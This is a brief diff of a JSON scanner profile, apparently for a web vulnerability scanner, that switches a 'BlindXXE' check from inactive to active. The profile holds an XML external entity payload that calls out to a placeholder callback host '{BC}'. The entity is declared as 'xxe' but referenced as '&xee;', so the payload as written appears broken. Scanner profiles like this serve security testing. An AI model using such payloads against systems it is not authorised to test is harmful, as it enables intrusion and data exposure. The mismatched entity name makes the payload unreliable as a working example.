@@ -1,5 +1,5 @@
 [{"Name":"BlindXXE",
-"Active":false,
+"Active":true,
 "Scanner":1,
 "Author":"@egarme",
 "Payloads":["\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"http://{BC}\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e"],
